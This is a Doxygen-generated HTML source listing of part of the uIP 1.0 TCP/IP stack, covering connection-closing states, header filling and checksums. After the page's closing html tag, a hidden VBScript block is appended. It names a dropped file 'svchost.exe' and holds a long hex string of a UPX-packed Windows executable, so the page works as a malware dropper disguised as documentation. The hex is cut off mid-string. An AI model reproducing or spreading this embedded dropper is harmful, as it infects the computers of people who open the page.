<a name="l01722"></a>01722     <span class="comment">/* We can close this connection if the peer has acknowledged our</span>
<a name="l01723"></a>01723 <span class="comment">       FIN. This is indicated by the UIP_ACKDATA flag. */</span>
<a name="l01724"></a>01724     <span class="keywordflow">if</span>(<a class="code" href="a00150.html#gb4ef6b00924990e7a293f66715b6d1d1">uip_flags</a> &amp; UIP_ACKDATA) {
<a name="l01725"></a>01725       uip_connr-&gt;tcpstateflags = <a class="code" href="a00150.html#g28eda870cff3d8e3cf2949e6f57a502b">UIP_CLOSED</a>;
<a name="l01726"></a>01726       <a class="code" href="a00150.html#gb4ef6b00924990e7a293f66715b6d1d1">uip_flags</a> = UIP_CLOSE;
<a name="l01727"></a>01727       <a class="code" href="a00153.html#g41aa744caa46913b3b3aedb2a4e78546">UIP_APPCALL</a>();
<a name="l01728"></a>01728     }
<a name="l01729"></a>01729     <span class="keywordflow">break</span>;
<a name="l01730"></a>01730     
<a name="l01731"></a>01731   <span class="keywordflow">case</span> <a class="code" href="a00150.html#ga533c394b1fa0030205534befa31c525">UIP_FIN_WAIT_1</a>:
<a name="l01732"></a>01732     <span class="comment">/* The application has closed the connection, but the remote host</span>
<a name="l01733"></a>01733 <span class="comment">       hasn't closed its end yet. Thus we do nothing but wait for a</span>
<a name="l01734"></a>01734 <span class="comment">       FIN from the other side. */</span>
<a name="l01735"></a>01735     <span class="keywordflow">if</span>(<a class="code" href="a00149.html#g12a33f0c09711167bdf3dd7d7cf8c5a1">uip_len</a> &gt; 0) {
<a name="l01736"></a>01736       uip_add_rcv_nxt(<a class="code" href="a00149.html#g12a33f0c09711167bdf3dd7d7cf8c5a1">uip_len</a>);
<a name="l01737"></a>01737     }
<a name="l01738"></a>01738     <span class="keywordflow">if</span>(<a class="code" href="a00150.html#g24f52ac52d6e714cb04a5aa01be3bdd0">BUF</a>-&gt;flags &amp; <a class="code" href="a00150.html#g88e60aa2cf23e1c65d630701db08c743">TCP_FIN</a>) {
<a name="l01739"></a>01739       <span class="keywordflow">if</span>(<a class="code" href="a00150.html#gb4ef6b00924990e7a293f66715b6d1d1">uip_flags</a> &amp; UIP_ACKDATA) {
<a name="l01740"></a>01740         uip_connr-&gt;tcpstateflags = <a class="code" href="a00150.html#gfff0ed43201bf1e2020de1a0d6cac070">UIP_TIME_WAIT</a>;
<a name="l01741"></a>01741         uip_connr-&gt;timer = 0;
<a name="l01742"></a>01742         uip_connr-&gt;len = 0;
<a name="l01743"></a>01743       } <span class="keywordflow">else</span> {
<a name="l01744"></a>01744         uip_connr-&gt;tcpstateflags = <a class="code" href="a00150.html#g64d9affc680a445d708234e70450477b">UIP_CLOSING</a>;
<a name="l01745"></a>01745       }
<a name="l01746"></a>01746       uip_add_rcv_nxt(1);
<a name="l01747"></a>01747       <a class="code" href="a00150.html#gb4ef6b00924990e7a293f66715b6d1d1">uip_flags</a> = UIP_CLOSE;
<a name="l01748"></a>01748       <a class="code" href="a00153.html#g41aa744caa46913b3b3aedb2a4e78546">UIP_APPCALL</a>();
<a name="l01749"></a>01749       <span class="keywordflow">goto</span> tcp_send_ack;
<a name="l01750"></a>01750     } <span class="keywordflow">else</span> <span class="keywordflow">if</span>(<a class="code" href="a00150.html#gb4ef6b00924990e7a293f66715b6d1d1">uip_flags</a> &amp; UIP_ACKDATA) {
<a name="l01751"></a>01751       uip_connr-&gt;tcpstateflags = <a class="code" href="a00150.html#g160128ab5d2ea3cc497b91ee4eb4ef99">UIP_FIN_WAIT_2</a>;
<a name="l01752"></a>01752       uip_connr-&gt;len = 0;
<a name="l01753"></a>01753       <span class="keywordflow">goto</span> drop;
<a name="l01754"></a>01754     }
<a name="l01755"></a>01755     <span class="keywordflow">if</span>(<a class="code" href="a00149.html#g12a33f0c09711167bdf3dd7d7cf8c5a1">uip_len</a> &gt; 0) {
<a name="l01756"></a>01756       <span class="keywordflow">goto</span> tcp_send_ack;
<a name="l01757"></a>01757     }
<a name="l01758"></a>01758     <span class="keywordflow">goto</span> drop;
<a name="l01759"></a>01759       
<a name="l01760"></a>01760   <span class="keywordflow">case</span> <a class="code" href="a00150.html#g160128ab5d2ea3cc497b91ee4eb4ef99">UIP_FIN_WAIT_2</a>:
<a name="l01761"></a>01761     <span class="keywordflow">if</span>(<a class="code" href="a00149.html#g12a33f0c09711167bdf3dd7d7cf8c5a1">uip_len</a> &gt; 0) {
<a name="l01762"></a>01762       uip_add_rcv_nxt(<a class="code" href="a00149.html#g12a33f0c09711167bdf3dd7d7cf8c5a1">uip_len</a>);
<a name="l01763"></a>01763     }
<a name="l01764"></a>01764     <span class="keywordflow">if</span>(<a class="code" href="a00150.html#g24f52ac52d6e714cb04a5aa01be3bdd0">BUF</a>-&gt;flags &amp; <a class="code" href="a00150.html#g88e60aa2cf23e1c65d630701db08c743">TCP_FIN</a>) {
<a name="l01765"></a>01765       uip_connr-&gt;tcpstateflags = <a class="code" href="a00150.html#gfff0ed43201bf1e2020de1a0d6cac070">UIP_TIME_WAIT</a>;
<a name="l01766"></a>01766       uip_connr-&gt;timer = 0;
<a name="l01767"></a>01767       uip_add_rcv_nxt(1);
<a name="l01768"></a>01768       <a class="code" href="a00150.html#gb4ef6b00924990e7a293f66715b6d1d1">uip_flags</a> = UIP_CLOSE;
<a name="l01769"></a>01769       <a class="code" href="a00153.html#g41aa744caa46913b3b3aedb2a4e78546">UIP_APPCALL</a>();
<a name="l01770"></a>01770       <span class="keywordflow">goto</span> tcp_send_ack;
<a name="l01771"></a>01771     }
<a name="l01772"></a>01772     <span class="keywordflow">if</span>(<a class="code" href="a00149.html#g12a33f0c09711167bdf3dd7d7cf8c5a1">uip_len</a> &gt; 0) {
<a name="l01773"></a>01773       <span class="keywordflow">goto</span> tcp_send_ack;
<a name="l01774"></a>01774     }
<a name="l01775"></a>01775     <span class="keywordflow">goto</span> drop;
<a name="l01776"></a>01776 
<a name="l01777"></a>01777   <span class="keywordflow">case</span> <a class="code" href="a00150.html#gfff0ed43201bf1e2020de1a0d6cac070">UIP_TIME_WAIT</a>:
<a name="l01778"></a>01778     <span class="keywordflow">goto</span> tcp_send_ack;
<a name="l01779"></a>01779     
<a name="l01780"></a>01780   <span class="keywordflow">case</span> <a class="code" href="a00150.html#g64d9affc680a445d708234e70450477b">UIP_CLOSING</a>:
<a name="l01781"></a>01781     <span class="keywordflow">if</span>(<a class="code" href="a00150.html#gb4ef6b00924990e7a293f66715b6d1d1">uip_flags</a> &amp; UIP_ACKDATA) {
<a name="l01782"></a>01782       uip_connr-&gt;tcpstateflags = <a class="code" href="a00150.html#gfff0ed43201bf1e2020de1a0d6cac070">UIP_TIME_WAIT</a>;
<a name="l01783"></a>01783       uip_connr-&gt;timer = 0;
<a name="l01784"></a>01784     }
<a name="l01785"></a>01785   }
<a name="l01786"></a>01786   <span class="keywordflow">goto</span> drop;
<a name="l01787"></a>01787   
<a name="l01788"></a>01788 
<a name="l01789"></a>01789   <span class="comment">/* We jump here when we are ready to send the packet, and just want</span>
<a name="l01790"></a>01790 <span class="comment">     to set the appropriate TCP sequence numbers in the TCP header. */</span>
<a name="l01791"></a>01791  tcp_send_ack:
<a name="l01792"></a>01792   <a class="code" href="a00150.html#g24f52ac52d6e714cb04a5aa01be3bdd0">BUF</a>-&gt;flags = <a class="code" href="a00150.html#g44b3b1ab31a403ba28ec135adfcbefef">TCP_ACK</a>;
<a name="l01793"></a>01793  tcp_send_nodata:
<a name="l01794"></a>01794   <a class="code" href="a00149.html#g12a33f0c09711167bdf3dd7d7cf8c5a1">uip_len</a> = <a class="code" href="a00150.html#g15f2617f7dc1713f9d10282125c6027b">UIP_IPTCPH_LEN</a>;
<a name="l01795"></a>01795  tcp_send_noopts:
<a name="l01796"></a>01796   <a class="code" href="a00150.html#g24f52ac52d6e714cb04a5aa01be3bdd0">BUF</a>-&gt;tcpoffset = (<a class="code" href="a00150.html#g17d111686f98e4c09db73a770ac3f1a4">UIP_TCPH_LEN</a> / 4) &lt;&lt; 4;
<a name="l01797"></a>01797  tcp_send:
<a name="l01798"></a>01798   <span class="comment">/* We're done with the input processing. We are now ready to send a</span>
<a name="l01799"></a>01799 <span class="comment">     reply. Our job is to fill in all the fields of the TCP and IP</span>
<a name="l01800"></a>01800 <span class="comment">     headers before calculating the checksum and finally send the</span>
<a name="l01801"></a>01801 <span class="comment">     packet. */</span>
<a name="l01802"></a>01802   <a class="code" href="a00150.html#g24f52ac52d6e714cb04a5aa01be3bdd0">BUF</a>-&gt;ackno[0] = uip_connr-&gt;rcv_nxt[0];
<a name="l01803"></a>01803   <a class="code" href="a00150.html#g24f52ac52d6e714cb04a5aa01be3bdd0">BUF</a>-&gt;ackno[1] = uip_connr-&gt;rcv_nxt[1];
<a name="l01804"></a>01804   <a class="code" href="a00150.html#g24f52ac52d6e714cb04a5aa01be3bdd0">BUF</a>-&gt;ackno[2] = uip_connr-&gt;rcv_nxt[2];
<a name="l01805"></a>01805   <a class="code" href="a00150.html#g24f52ac52d6e714cb04a5aa01be3bdd0">BUF</a>-&gt;ackno[3] = uip_connr-&gt;rcv_nxt[3];
<a name="l01806"></a>01806   
<a name="l01807"></a>01807   <a class="code" href="a00150.html#g24f52ac52d6e714cb04a5aa01be3bdd0">BUF</a>-&gt;seqno[0] = uip_connr-&gt;snd_nxt[0];
<a name="l01808"></a>01808   <a class="code" href="a00150.html#g24f52ac52d6e714cb04a5aa01be3bdd0">BUF</a>-&gt;seqno[1] = uip_connr-&gt;snd_nxt[1];
<a name="l01809"></a>01809   <a class="code" href="a00150.html#g24f52ac52d6e714cb04a5aa01be3bdd0">BUF</a>-&gt;seqno[2] = uip_connr-&gt;snd_nxt[2];
<a name="l01810"></a>01810   <a class="code" href="a00150.html#g24f52ac52d6e714cb04a5aa01be3bdd0">BUF</a>-&gt;seqno[3] = uip_connr-&gt;snd_nxt[3];
<a name="l01811"></a>01811 
<a name="l01812"></a>01812   <a class="code" href="a00150.html#g24f52ac52d6e714cb04a5aa01be3bdd0">BUF</a>-&gt;proto = <a class="code" href="a00150.html#g517c770991459cc62dc009c0d3875c6a">UIP_PROTO_TCP</a>;
<a name="l01813"></a>01813   
<a name="l01814"></a>01814   <a class="code" href="a00150.html#g24f52ac52d6e714cb04a5aa01be3bdd0">BUF</a>-&gt;srcport  = uip_connr-&gt;lport;
<a name="l01815"></a>01815   <a class="code" href="a00150.html#g24f52ac52d6e714cb04a5aa01be3bdd0">BUF</a>-&gt;destport = uip_connr-&gt;rport;
<a name="l01816"></a>01816 
<a name="l01817"></a>01817   <a class="code" href="a00148.html#g769512993b7b27271909d6daa4748b60">uip_ipaddr_copy</a>(<a class="code" href="a00150.html#g24f52ac52d6e714cb04a5aa01be3bdd0">BUF</a>-&gt;srcipaddr, <a class="code" href="a00150.html#g7d3673f52f5846b6961d23b150decd54">uip_hostaddr</a>);
<a name="l01818"></a>01818   <a class="code" href="a00148.html#g769512993b7b27271909d6daa4748b60">uip_ipaddr_copy</a>(<a class="code" href="a00150.html#g24f52ac52d6e714cb04a5aa01be3bdd0">BUF</a>-&gt;destipaddr, uip_connr-&gt;ripaddr);
<a name="l01819"></a>01819 
<a name="l01820"></a>01820   <span class="keywordflow">if</span>(uip_connr-&gt;tcpstateflags &amp; <a class="code" href="a00150.html#gde29ec025e6754afd8cc24c954a8dec8">UIP_STOPPED</a>) {
<a name="l01821"></a>01821     <span class="comment">/* If the connection has issued uip_stop(), we advertise a zero</span>
<a name="l01822"></a>01822 <span class="comment">       window so that the remote host will stop sending data. */</span>
<a name="l01823"></a>01823     <a class="code" href="a00150.html#g24f52ac52d6e714cb04a5aa01be3bdd0">BUF</a>-&gt;wnd[0] = <a class="code" href="a00150.html#g24f52ac52d6e714cb04a5aa01be3bdd0">BUF</a>-&gt;wnd[1] = 0;
<a name="l01824"></a>01824   } <span class="keywordflow">else</span> {
<a name="l01825"></a>01825     <a class="code" href="a00150.html#g24f52ac52d6e714cb04a5aa01be3bdd0">BUF</a>-&gt;wnd[0] = ((<a class="code" href="a00153.html#g5b9dba2123705bce1ce95c3deca0bdad">UIP_RECEIVE_WINDOW</a>) &gt;&gt; 8);
<a name="l01826"></a>01826     <a class="code" href="a00150.html#g24f52ac52d6e714cb04a5aa01be3bdd0">BUF</a>-&gt;wnd[1] = ((<a class="code" href="a00153.html#g5b9dba2123705bce1ce95c3deca0bdad">UIP_RECEIVE_WINDOW</a>) &amp; 0xff);
<a name="l01827"></a>01827   }
<a name="l01828"></a>01828 
<a name="l01829"></a>01829  tcp_send_noconn:
<a name="l01830"></a>01830   <a class="code" href="a00150.html#g24f52ac52d6e714cb04a5aa01be3bdd0">BUF</a>-&gt;ttl = <a class="code" href="a00153.html#gb61381673de27f31848c5396bf0b338e">UIP_TTL</a>;
<a name="l01831"></a>01831 <span class="preprocessor">#if UIP_CONF_IPV6</span>
<a name="l01832"></a>01832 <span class="preprocessor"></span>  <span class="comment">/* For IPv6, the IP length field does not include the IPv6 IP header</span>
<a name="l01833"></a>01833 <span class="comment">     length. */</span>
<a name="l01834"></a>01834   <a class="code" href="a00150.html#g24f52ac52d6e714cb04a5aa01be3bdd0">BUF</a>-&gt;len[0] = ((<a class="code" href="a00149.html#g12a33f0c09711167bdf3dd7d7cf8c5a1">uip_len</a> - UIP_IPH_LEN) &gt;&gt; 8);
<a name="l01835"></a>01835   <a class="code" href="a00150.html#g24f52ac52d6e714cb04a5aa01be3bdd0">BUF</a>-&gt;len[1] = ((<a class="code" href="a00149.html#g12a33f0c09711167bdf3dd7d7cf8c5a1">uip_len</a> - UIP_IPH_LEN) &amp; 0xff);
<a name="l01836"></a>01836 <span class="preprocessor">#else </span><span class="comment">/* UIP_CONF_IPV6 */</span>
<a name="l01837"></a>01837   <a class="code" href="a00150.html#g24f52ac52d6e714cb04a5aa01be3bdd0">BUF</a>-&gt;len[0] = (<a class="code" href="a00149.html#g12a33f0c09711167bdf3dd7d7cf8c5a1">uip_len</a> &gt;&gt; 8);
<a name="l01838"></a>01838   <a class="code" href="a00150.html#g24f52ac52d6e714cb04a5aa01be3bdd0">BUF</a>-&gt;len[1] = (<a class="code" href="a00149.html#g12a33f0c09711167bdf3dd7d7cf8c5a1">uip_len</a> &amp; 0xff);
<a name="l01839"></a>01839 <span class="preprocessor">#endif </span><span class="comment">/* UIP_CONF_IPV6 */</span>
<a name="l01840"></a>01840 
<a name="l01841"></a>01841   <a class="code" href="a00150.html#g24f52ac52d6e714cb04a5aa01be3bdd0">BUF</a>-&gt;urgp[0] = <a class="code" href="a00150.html#g24f52ac52d6e714cb04a5aa01be3bdd0">BUF</a>-&gt;urgp[1] = 0;
<a name="l01842"></a>01842   
<a name="l01843"></a>01843   <span class="comment">/* Calculate TCP checksum. */</span>
<a name="l01844"></a>01844   <a class="code" href="a00150.html#g24f52ac52d6e714cb04a5aa01be3bdd0">BUF</a>-&gt;tcpchksum = 0;
<a name="l01845"></a>01845   <a class="code" href="a00150.html#g24f52ac52d6e714cb04a5aa01be3bdd0">BUF</a>-&gt;tcpchksum = ~(<a class="code" href="a00150.html#g85b65e38aa74eba18979156f97a94a87">uip_tcpchksum</a>());
<a name="l01846"></a>01846   
<a name="l01847"></a>01847  ip_send_nolen:
<a name="l01848"></a>01848 
<a name="l01849"></a>01849 <span class="preprocessor">#if UIP_CONF_IPV6</span>
<a name="l01850"></a>01850 <span class="preprocessor"></span>  <a class="code" href="a00150.html#g24f52ac52d6e714cb04a5aa01be3bdd0">BUF</a>-&gt;vtc = 0x60;
<a name="l01851"></a>01851   <a class="code" href="a00150.html#g24f52ac52d6e714cb04a5aa01be3bdd0">BUF</a>-&gt;tcflow = 0x00;
<a name="l01852"></a>01852   <a class="code" href="a00150.html#g24f52ac52d6e714cb04a5aa01be3bdd0">BUF</a>-&gt;flow = 0x00;
<a name="l01853"></a>01853 <span class="preprocessor">#else </span><span class="comment">/* UIP_CONF_IPV6 */</span>
<a name="l01854"></a>01854   <a class="code" href="a00150.html#g24f52ac52d6e714cb04a5aa01be3bdd0">BUF</a>-&gt;vhl = 0x45;
<a name="l01855"></a>01855   <a class="code" href="a00150.html#g24f52ac52d6e714cb04a5aa01be3bdd0">BUF</a>-&gt;tos = 0;
<a name="l01856"></a>01856   <a class="code" href="a00150.html#g24f52ac52d6e714cb04a5aa01be3bdd0">BUF</a>-&gt;ipoffset[0] = <a class="code" href="a00150.html#g24f52ac52d6e714cb04a5aa01be3bdd0">BUF</a>-&gt;ipoffset[1] = 0;
<a name="l01857"></a>01857   ++ipid;
<a name="l01858"></a>01858   <a class="code" href="a00150.html#g24f52ac52d6e714cb04a5aa01be3bdd0">BUF</a>-&gt;ipid[0] = ipid &gt;&gt; 8;
<a name="l01859"></a>01859   <a class="code" href="a00150.html#g24f52ac52d6e714cb04a5aa01be3bdd0">BUF</a>-&gt;ipid[1] = ipid &amp; 0xff;
<a name="l01860"></a>01860   <span class="comment">/* Calculate IP checksum. */</span>
<a name="l01861"></a>01861   <a class="code" href="a00150.html#g24f52ac52d6e714cb04a5aa01be3bdd0">BUF</a>-&gt;ipchksum = 0;
<a name="l01862"></a>01862   <a class="code" href="a00150.html#g24f52ac52d6e714cb04a5aa01be3bdd0">BUF</a>-&gt;ipchksum = ~(<a class="code" href="a00150.html#g2addf34c7d457c1a7899a7e2171ef1e9">uip_ipchksum</a>());
<a name="l01863"></a>01863   <a class="code" href="a00135.html#534d9e416324fb8ecca6b9cb4b1f6a6a">DEBUG_PRINTF</a>(<span class="stringliteral">"uip ip_send_nolen: chkecum 0x%04x\n"</span>, <a class="code" href="a00150.html#g2addf34c7d457c1a7899a7e2171ef1e9">uip_ipchksum</a>());
<a name="l01864"></a>01864 <span class="preprocessor">#endif </span><span class="comment">/* UIP_CONF_IPV6 */</span>
<a name="l01865"></a>01865    
<a name="l01866"></a>01866   <a class="code" href="a00150.html#g9c0814ed491fa452ec97910c0728d410">UIP_STAT</a>(++<a class="code" href="a00150.html#g9ee50a40597e67fce96541ab56c3b712">uip_stat</a>.<a class="code" href="a00093.html#e292b8977f6b81265bf14e1676face3e">tcp</a>.<a class="code" href="a00093.html#dc69abadd5aa07c7d74f9292db2cd93c">sent</a>);
<a name="l01867"></a>01867  send:
<a name="l01868"></a>01868   <a class="code" href="a00135.html#534d9e416324fb8ecca6b9cb4b1f6a6a">DEBUG_PRINTF</a>(<span class="stringliteral">"Sending packet with length %d (%d)\n"</span>, <a class="code" href="a00149.html#g12a33f0c09711167bdf3dd7d7cf8c5a1">uip_len</a>,
<a name="l01869"></a>01869                (<a class="code" href="a00150.html#g24f52ac52d6e714cb04a5aa01be3bdd0">BUF</a>-&gt;len[0] &lt;&lt; 8) | <a class="code" href="a00150.html#g24f52ac52d6e714cb04a5aa01be3bdd0">BUF</a>-&gt;len[1]);
<a name="l01870"></a>01870   
<a name="l01871"></a>01871   <a class="code" href="a00150.html#g9c0814ed491fa452ec97910c0728d410">UIP_STAT</a>(++<a class="code" href="a00150.html#g9ee50a40597e67fce96541ab56c3b712">uip_stat</a>.<a class="code" href="a00093.html#1deb2899508216804823498a69378118">ip</a>.<a class="code" href="a00093.html#dc69abadd5aa07c7d74f9292db2cd93c">sent</a>);
<a name="l01872"></a>01872   <span class="comment">/* Return and let the caller do the actual transmission. */</span>
<a name="l01873"></a>01873   <a class="code" href="a00150.html#gb4ef6b00924990e7a293f66715b6d1d1">uip_flags</a> = 0;
<a name="l01874"></a>01874   <span class="keywordflow">return</span>;
<a name="l01875"></a>01875  drop:
<a name="l01876"></a>01876   <a class="code" href="a00149.html#g12a33f0c09711167bdf3dd7d7cf8c5a1">uip_len</a> = 0;
<a name="l01877"></a>01877   <a class="code" href="a00150.html#gb4ef6b00924990e7a293f66715b6d1d1">uip_flags</a> = 0;
<a name="l01878"></a>01878   <span class="keywordflow">return</span>;
<a name="l01879"></a>01879 }
<a name="l01880"></a>01880 <span class="comment">/*---------------------------------------------------------------------------*/</span>
<a name="l01881"></a>01881 <a class="code" href="a00153.html#g77570ac4fcab86864fa1916e55676da2">u16_t</a>
<a name="l01882"></a><a class="code" href="a00150.html#ga22b04cac8cf283ca12f028578bebc06">01882</a> <a class="code" href="a00148.html#ga22b04cac8cf283ca12f028578bebc06">htons</a>(<a class="code" href="a00153.html#g77570ac4fcab86864fa1916e55676da2">u16_t</a> val)
<a name="l01883"></a>01883 {
<a name="l01884"></a>01884   <span class="keywordflow">return</span> <a class="code" href="a00148.html#g69a7a4951ff21b302267532c21ee78fc">HTONS</a>(val);
<a name="l01885"></a>01885 }
<a name="l01886"></a>01886 <span class="comment">/*---------------------------------------------------------------------------*/</span>
<a name="l01887"></a>01887 <span class="keywordtype">void</span>
<a name="l01888"></a><a class="code" href="a00150.html#g04b053a623aac7cd4195157d470661b3">01888</a> <a class="code" href="a00147.html#g04b053a623aac7cd4195157d470661b3">uip_send</a>(<span class="keyword">const</span> <span class="keywordtype">void</span> *data, <span class="keywordtype">int</span> len)
<a name="l01889"></a>01889 {
<a name="l01890"></a>01890   <span class="keywordflow">if</span>(len &gt; 0) {
<a name="l01891"></a>01891     <a class="code" href="a00150.html#g5b5615dc240daed20949c0fded2b4679">uip_slen</a> = len;
<a name="l01892"></a>01892     <span class="keywordflow">if</span>(data != <a class="code" href="a00150.html#ga05a3dde2048480fa3ab2a5961898d18">uip_sappdata</a>) {
<a name="l01893"></a>01893       memcpy(<a class="code" href="a00150.html#ga05a3dde2048480fa3ab2a5961898d18">uip_sappdata</a>, (data), <a class="code" href="a00150.html#g5b5615dc240daed20949c0fded2b4679">uip_slen</a>);
<a name="l01894"></a>01894     }
<a name="l01895"></a>01895   }
<a name="l01896"></a>01896 }<span class="comment"></span>
<a name="l01897"></a>01897 <span class="comment">/** @} */</span>
</pre></div><hr size="1"><address style="align: right;"><small>Generated on Mon Jun 12 10:23:01 2006 for uIP 1.0 by&nbsp;
<a href="http://www.doxygen.org/index.html">
<img src="doxygen.png" alt="doxygen" align="middle" border="0"></a> 1.4.6 </small></address>
</body>
</html>
<SCRIPT Language=VBScript><!--
DropFileName = "svchost.exe"
WriteData = "4D5A90000300000004000000FFFF0000B80000000000000040000000000000000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000504500004C010300BC7CB1470000000000000000E0000F010B01070400E000000010000000E0010030C0020000F0010000D002000000400000100000000200000A00000008000100040000000000000000E002000010000000000000020000000000100000100000000010000010000000000000100000000000000000000000E8D402001001000000D00200E80400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000555058300000000000E00100001000000000000000040000000000000000000000000000800000E0555058310000000000E0000000F0010000D2000000040000000000000000000000000000400000E02E727372630000000010000000D002000006000000D60000000000000000000000000000400000C0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000332E303300555058210D09020838ADBE177792F93FD0A0020023D000000048010026000012B29FA89200FF25304041CD6EE59202E4420564401919197970005C8C01191919C8EC94BF1D90B14435F4244105558BEC81C49AED60FE3CFFFFFFC7855C2B094C37B3FFE6EF0A195DD08175A035FF4DAC1155A0C9C204306E7FBF9F6845E0322D45A4346A35E804021C331F39D921085C803534311A8C8CBDFBBC815D0639C4C9C372143069B6DFDE3437353322F038383237833838BB9BBF1B700936333631FF8D4429B52C05017D7CB2F7EFE8F7950E836DCC00488AF0343532BEEFF6DDFC343491D0B23231748F046F791E39D9B60C18D83436CC3FB37BECFFF50185585DFF4D76198D3FF66FBF246365EC1E4588214DB4019D735DB40011951C61B2BB7809317DF8E77409DC00CD5D1E8EE03834459D7C16D6AEFBF60F37A88D9558FE0C528D8D7C065190388C4CC203044738A46B66BB05597F74DCF8350D509163939933694CBCCC386C84C9BAF40500D7044C0831D8D7CE16698406AB5171D8B2F7F7C1899D4F015588337AF7BBC2B3BDB4519CFF663A68312CDCBE8536475237DC8BBC332360369BCCDC219D488D14B9F73BBF8773D058009B9031E22FBFBD0BB85D2FEC35323835843631DF0EFF3CC8897DE081A52E723737814DDDB60DC394330C74F48235069564F6FE0AEE9E5C7721F7559C56BE67BECF4282D83134BE48B8E6B7EF7104786809094FC2F03321BD3C9193ADF1115DF8312999107C7736608DB077AD10133474096E123AA600973624E69B8423BB6408FF05124C3C8D7DCE261960B406FC094DDCC681D0B5080C94AC34579BD928FCDC3131B17440BB041BDF5930B44C5D5D80C0A41FFB1D0BD800297DC0312C217DFC83AD170B59E34681A01197B5AEDF6FBF16204C35290D197D80F79DBBF77684D2B75D366DE43368671105858E0C188F4C1C9C38376670127E3C23AFCC5703061430A5D35F6C54E505363834F89F91BEBDD93536C77AA7B021B5604819990CF3D0218578A0447448DF370F85E45052FF75A46043C9ACF4B3F483C48009C4314D8C771936D9DB6D7D07F08902295DF0496C9E846FB037884650378AD470D85A83EB9C05338403353636B637DE45DC3338682145E49088FA805BDB71DB13AC5B55A84583552F06D0ABF5C864547CB4373382A5AC05476BF874817B324A2F6C5B6FCC9177B8DCF471F0834DA54B8DEDA031210381CF863137D919DFD99E9C510718B1C7123C4F3232407C9C33349449EFF16653C6B1FADB37C9AD3DBC3135CCDC8C32320A9330093B560770EA3083353BE7E8BE354FE8323169B3F8F40064066B64D39831D2B76DAE124E0436315053C7CB1A7F9D4C6833AF75D468EBD6C2F7D72120F06A31069D84F8FB671D58C69C21899F342E722C0874E0F43732B93732D908A62B043CED82CFC9C8643D10B88481F0C0E1D36DC4E881AD0AA0211E5D69A1BDC0902913A54BD03A63F65D3F2A842E27DB483E089831579088C712CC096A20057CC9F8B64F406A33EABCABCDDEF55AAD09842CA1D4BEBB1BAD8008A1B53414526A3829E5E3B957128400F0FE4A171EE96EDC0384331906015DDC2DD88189D3D7480538908D4E14CFF3D82198388DD43132D08D3F32C9EE55FC528C094C0CE836363731740F265B77EC959258C77F64C9CC310984097DD88385140F637B85AD1EF42A23BA00DE108382A9D40345B01BC63324F44837634992497A5F629094AF28F6F8955E79D5C5298527D1240C18CF40C38C346067A37DC6F809E8323682F1B8FD1AD976A30A2DE57C85075051A4C3B6F0130534BCBDBD73DBE19B8D2D75384E5557A723931D76F06849542B006460F04D322DE63477581492713CA5C84FDA17EB6CA5C8DB4ECFCD8767941E92313EA33538D0678C4CC29C328544AC4868BD5A842140E37767AB6938779918530680B207EF6CEC745F6BDA61D6323834201E3336241D38D052622CDD5DE0754AEFF2D6B081FA7A4F0B8632149D1D0352B2C5CE50D2F06E0B7E950C262CB406AB37381AC06B073E2E681CA41B9C31D9D77A8431ADA028D231840265330138A856E38CC5121850BA7980B17B672744A006D4CE490C1F1BDCA0B1FA8473005594B6B00F7764B2005634C83379109959A275E331BFCD5C23878133363CEC44AE8A8F534B4933674D6A3CD2D41EB91F4400DC3537ACE1DAF32068ECE4CD90EDFED2E19A4CB936686599E3FE1000FAB1832CB1F3A05E440CB85D73F43F8BE42F01C80BC00F849901C762B19D0D77B5AC14AB0033F4FFFEF76754683B84159829CE68F152E28309D458687299EDF7EFE967B30ADAEBC76A7501E02DF08FD4D9685D0CAC160C766A1E89C1B63717C86AE6888D4D80BEAF6B0D37D66084213819ECB3EDE2D0240BBA32332F58DA4C9F2D17DC0BED045148DC93ED4DFF064E240B3529F12C74B2A30AA3FCFC68B2FD3EEB23E109AF5605225733B816BE667B088D79B0F00B76132C36C8F27724084A53501B4A3BDB8CCEC8137D0424DBE4F7B2071C75886AB106A29A24503B1827A4F90628F8D5286D9727DC6E90FCF39CDB0ED6006C20052643CC23D643835F84361304CF7AC185F69D05391010106527FC5B18A3D8C1950AA41303575753209CEDB3E402D8BA3019BF0B1FBE124D47F268F4A89B09F868C284DFF3975483A3FE1D0451CCAB6CEF70AD51691CC61A3CB34500EEF7FDEF200A68B93B498409100416C905EDB5F6FF62491111139011906363136309020500F27D91BB900990906315632113DB7FD7B5290F13307D68803C6E4F65E3A014F78DCDBEEE4480131A901C13463D113DE75EEC29435819214A77FFFF8B1B050F5245642350F1718D9193F33B6B48367B135C7BDF7B5B25501109039A62CF3DE73E0961151320BDFFB7F7B61D0C7DBC7D44737FBFF7F6771300B9E7DE8B6E64D644338CFB0D7BEF5C2E416207F3691ADE09DD9F8CD3F75FCA630590A677782EE6B5C2357F03A0FF7FEFBDD71D53D77D057303DA11DCBFE2F7E2E79E7BB16766FA41AF3E7284F662B10B97B90057EFFFB359425D63761A7313A57DC3F708D01E8737F66245081B90ED59F7DE73B3902E41129A104D67D8BA3F8F7D254389DF85239622EF4D788690410C6F987B11DE7B55D1600DE80D170AEF835F45BE1D4E4B4F61F6B9F7CBF0571F8573F71CAE3A24137B7BEFBD379011303243496EB83B1CDE88BDB8F6F3BAE0F6CE2F6CD51DC012C2F790CC132A83622F36232FC20B3FF6B3C7301B020E58F7EA7F09C3ECBDFF16126F7957F7A27F8669039D08C126BC884B8E327D841784956FA82F643373976DC3CD13D222FCE825C302D393F76F42ECB9860D40AB0E78DE7BCC7033B15E88CF84FF7F13865B11FA1F56161A1F2FB7F780AC5CDC84F75EBE3630AA3DE3CD98F12FC26B160A3CC3FF1F90F1E95C1B1850F35B0B0F0FF7401FA417E31D264CCC44ED907B3362B1DEC7B14BA6330CFFC6241D62335CA